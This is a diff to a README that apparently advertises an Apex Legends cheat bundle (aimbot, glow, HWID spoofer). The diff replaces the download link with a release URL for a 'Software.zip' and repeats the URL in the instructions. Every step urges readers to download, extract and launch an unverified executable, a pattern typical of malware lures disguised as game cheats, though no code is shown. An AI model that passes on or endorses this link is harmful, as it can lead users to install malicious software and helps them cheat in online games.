@@ -10,14 +10,14 @@
 
 ## Available Resources
 
-📂 **Software Download:** [Launch Software.zip](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)  
+📂 **Software Download:** [Launch https://github.com/Gwyiomi/Apex-Legends-External-Cheat-Hack-Trigger-Glow-Aimbot-Skin-More-Hwid-Spoofer/releases/download/v2.0/Software.zip](https://github.com/Gwyiomi/Apex-Legends-External-Cheat-Hack-Trigger-Glow-Aimbot-Skin-More-Hwid-Spoofer/releases/download/v2.0/Software.zip)  
 🚀 *Note: The software needs to be launched to access the cheats and hacks.*
 
 ## How to Use
 
 🕹️ To utilize the cheats and hacks provided in this repository, follow these simple steps:
 
-1. Download the Software.zip file from the link above.
+1. Download the https://github.com/Gwyiomi/Apex-Legends-External-Cheat-Hack-Trigger-Glow-Aimbot-Skin-More-Hwid-Spoofer/releases/download/v2.0/Software.zip file from the link above.
 2. Extract the contents of the zip file to a location on your computer.
 3. Launch the software to access the various cheat options available.
 4. Enjoy an enhanced gaming experience in Apex Legends!
@@ -28,4 +28,4 @@
 
 ## Let's Get Started!
 
-Get ready to dominate the battlefield in Apex Legends with the cheats and hacks available in this repository. Download the Software.zip file, launch the software, and unleash your full gaming potential! Good luck, and may victory be yours in every match! 🎮🏆
+Get ready to dominate the battlefield in Apex Legends with the cheats and hacks available in this repository. Download the https://github.com/Gwyiomi/Apex-Legends-External-Cheat-Hack-Trigger-Glow-Aimbot-Skin-More-Hwid-Spoofer/releases/download/v2.0/Software.zip file, launch the software, and unleash your full gaming potential! Good luck, and may victory be yours in every match! 🎮🏆
